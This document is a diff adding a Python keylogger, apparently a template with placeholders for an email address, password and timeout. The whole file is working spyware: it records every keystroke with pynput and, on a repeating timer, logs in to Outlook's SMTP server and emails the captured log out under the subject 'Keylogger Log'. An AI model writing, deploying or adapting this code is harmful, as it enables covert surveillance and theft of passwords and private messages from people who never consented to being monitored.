@@ -1,0 +1,72 @@
+from pynput import keyboard as kb
+import smtplib
+import threading 
+
+email1 = "{user_mail}"
+password1 = "{user_mail_password}"
+timeout1 = {time_out}
+
+log = ""
+
+def callback_function(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+
+        if key == key.space:
+            log += " "
+
+        elif key == key.backspace:
+            log += " [BackSpace] "
+
+        elif key == key.enter:
+            log += " [ENTER] "
+
+        elif key == key.caps_lock:
+            log += " [CapsLock] "
+
+        elif key == key.ctrl_l:
+            log += " [CTRL] "
+
+        elif key == key.shift:
+            log += " [Shift] "
+
+        elif key == key.shift_r:
+            log += " [Shift] "
+
+        elif key == key.tab:
+            log = log + " [Tab] "
+
+        else:
+            log = log + str(key)
+    except:
+        pass
+    print(log)
+
+def mail_sendder(email, password, message):
+    global log
+    email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
+    email_server.starttls()
+    email_server.login(email, password)
+    message = f"Subject: Keylogger Log:\n\n {log}"
+    email_server.sendmail(email, email, message.encode('utf-8'))
+    email_server.quit()
+    log = log[:0]
+
+def thread_function():
+    global log
+    try:
+        mail_sendder(email1, password1, log.encode("utf-8"))
+        timer_object = threading.Timer(timeout1, thread_function)
+        timer_object.start()
+    except:
+        wait_time = 60
+        timer = threading.Timer(wait_time, thread_function)
+        timer.start()
+
+keyboard_listener = kb.Listener(on_press = callback_function)
+
+with keyboard_listener:
+    thread_function()
+    keyboard_listener.join()
